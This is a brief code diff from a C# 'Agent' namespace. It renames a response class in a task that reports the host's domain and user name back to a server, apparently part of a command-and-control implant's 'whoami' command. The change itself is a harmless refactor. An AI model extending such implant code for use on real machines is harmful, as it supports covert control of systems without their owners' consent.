@@ -15,7 +15,7 @@ namespace Agent
         }
         public async Task Execute(ServerJob job)
         {
-            await messageManager.AddResponse(new ResponseResult()
+            await messageManager.AddResponse(new TaskResponse()
             {
                 task_id = job.task.id,
                 user_output = $"{Environment.UserDomainName}\\{Environment.UserName}",
